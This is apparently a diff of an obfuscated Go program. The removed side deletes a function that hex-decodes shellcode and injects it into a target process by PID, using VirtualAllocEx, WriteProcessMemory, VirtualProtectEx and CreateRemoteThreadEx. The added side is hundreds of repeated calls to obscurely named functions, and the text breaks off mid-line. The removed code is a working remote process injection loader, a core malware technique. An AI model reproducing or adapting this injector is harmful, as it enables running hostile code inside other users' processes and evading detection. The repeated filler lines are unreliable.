@@ -35,92 +35,682 @@ func main() {
 
 	aacbdc()
 
-	a9cdbd()
-}
+	a22dab()
 
-func a4b5c6() {
-	a1d2e3, err1 := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
-	if err1 != nil {
-		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err1.Error()))
-	}
-	a10bfc := windows.NewLazySystemDLL("kernel32.dll")
+	a33cac()
 
-	a11bfc := a10bfc.NewProc("VirtualAllocEx")
-	a12bfc := a10bfc.NewProc("VirtualProtectEx")
-	a13bfc := a10bfc.NewProc("WriteProcessMemory")
-	a14bfc := a10bfc.NewProc("CreateRemoteThreadEx")
+	a4dcad()
 
-	if *a2b3c4 {
-		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *a3b4c5))
-	}
-	a15bfc, err2 := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*a3b4c5))
+	a5eadb()
 
-	if err2 != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", err2.Error()))
-	}
-	if *a1b2c3 {
-		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *a3b4c5))
-	}
+	a6fbba()
 
-	if *a2b3c4 {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *a3b4c5))
-	}
-	a16bfc, _, err3 := a11bfc.Call(uintptr(a15bfc), 0, uintptr(len(a1d2e3)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	a7cbdb()
 
-	if err3 != nil && err3.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err3.Error()))
-	}
+	a8bdcf()
 
-	if a16bfc == 0 {
-		log.Fatal("[!]VirtualAllocEx failed and returned 0")
-	}
-	if *a1b2c3 {
-		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *a3b4c5))
-	}
+	a9cedb()
 
-	if *a2b3c4 {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *a3b4c5))
-	}
-	_, _, err4 := a13bfc.Call(uintptr(a15bfc), a16bfc, (uintptr)(unsafe.Pointer(&a1d2e3[0])), uintptr(len(a1d2e3)))
+	a6083e()
 
-	if err4 != nil && err4.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", err4.Error()))
-	}
-	if *a1b2c3 {
-		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *a3b4c5))
-	}
+	a6083e()
 
-	if *a2b3c4 {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *a3b4c5))
-	}
-	oldProtect := windows.PAGE_READWRITE
-	_, _, err5 := a12bfc.Call(uintptr(a15bfc), a16bfc, uintptr(len(a1d2e3)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if err5 != nil && err5.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", err5.Error()))
-	}
-	if *a1b2c3 {
-		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *a3b4c5))
-	}
+	a6083e()
 
-	if *a2b3c4 {
-		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *a3b4c5))
-	}
-	_, _, err6 := a14bfc.Call(uintptr(a15bfc), 0, 0, a16bfc, 0, 0, 0)
-	if err6 != nil && err6.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", err6.Error()))
-	}
-	if *a1b2c3 {
-		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *a3b4c5))
-	}
+	a6083e()
 
-	if *a2b3c4 {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *a3b4c5))
-	}
-	err7 := windows.CloseHandle(a15bfc)
-	if err7 != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", err7.Error()))
-	}
-	if *a1b2c3 {
-		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *a3b4c5))
-	}
-}
+	a6083e()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a5b23c()
+
+	a
